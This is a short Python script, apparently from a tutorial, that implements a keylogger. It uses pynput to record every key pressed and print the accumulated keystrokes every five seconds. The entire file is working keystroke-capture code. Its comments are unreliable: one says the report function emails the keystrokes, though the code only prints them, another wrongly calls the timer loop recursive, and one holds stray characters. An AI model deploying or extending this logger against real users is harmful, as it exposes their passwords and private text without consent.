'''
Allows us to monitor and control mouse and keyboard.
'''
import pynput.keyboard
import threading

log = ""

'''
A callback function. A callback function is a function passed to a method so that the method
can call the function when the method has completed its work. 
'''
def process_key_press(key):
    global log  #Using global variable so it is not created every time.

    try:
        log += str(key.char)
    except AttributeError:  #If the key is not a character then an exception is thrown.fde df
        if key == key.space:
            log += " "
        else:
            log += str(key)

'''
Function to send an email about the user key strokes. Runs on a separate thread. 
A function that calls itself is a recursive function.
'''
def report():
    global log
    print(log)
    log = ""
    timer = threading.Timer(5, report)    #After 5 seconds call the function report, runs on a separate thread.
    timer.start()

keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)    #Everytime a key is pressed print it.

with keyboard_listener:
    report()
    keyboard_listener.join()






